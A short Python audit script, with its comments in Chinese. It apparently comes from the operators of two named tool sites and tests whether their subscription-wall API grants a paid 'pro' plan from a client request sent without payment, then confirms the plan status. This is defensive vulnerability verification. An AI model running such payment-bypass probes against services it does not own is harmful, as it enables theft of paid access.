#!/usr/bin/env python3
"""验证订阅墙 subscribe 漏洞: 客户端能否不付款直接激活订阅"""
import urllib.request, urllib.error, json, time

TARGETS = {
    "Vercel 主站": "https://tools.highkingflower.com",
    "阿里云 tools-cn": "https://tools-cn.highkingflower.com",
}

def post(base, path, payload):
    try:
        req = urllib.request.Request(base+path, data=json.dumps(payload).encode(),
            method="POST", headers={"User-Agent":"audit","Content-Type":"application/json"})
        with urllib.request.urlopen(req, timeout=25) as r:
            return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, (e.read() or b"").decode("utf-8","replace")
    except Exception as e:
        return 0, str(e)

ts = int(time.time())
print("="*64)
print("  订阅墙 subscribe 漏洞验证 (不付款能否直接激活?)")
print("="*64)

for name, base in TARGETS.items():
    print(f"\n### {name}: {base}")
    ref = f"walltest_{ts}"

    # 1. 客户端直接 subscribe (不经过支付) → 看是否激活
    st, body = post(base, "/api/subwall", {"action":"subscribe","ref":ref,"plan":"pro"})
    j = json.loads(body) if body.strip().startswith("{") else {}
    activated = j.get("ok") is True
    print(f"  [subscribe] /api/subwall action=subscribe: HTTP {st}  ok={j.get('ok')}  → {'⚠️ 不付款就能激活订阅(漏洞!)' if activated else '✅ 拒绝(正常)'}: {body[:120]}")

    # 2. 再 check 这个 ref 是否真的拿到 pro
    st2, body2 = post(base, "/api/subwall", {"action":"check","ref":ref})
    j2 = json.loads(body2) if body2.strip().startswith("{") else {}
    print(f"  [check] 该 ref 订阅状态: subscribed={j2.get('subscribed')} plan={j2.get('plan')} days_left={j2.get('days_remaining')}")
    if j2.get("subscribed"):
        print(f"     ⚠️ 确认漏洞: 客户端未付款已持有 {j2.get('plan')} 订阅 → 需堵死")
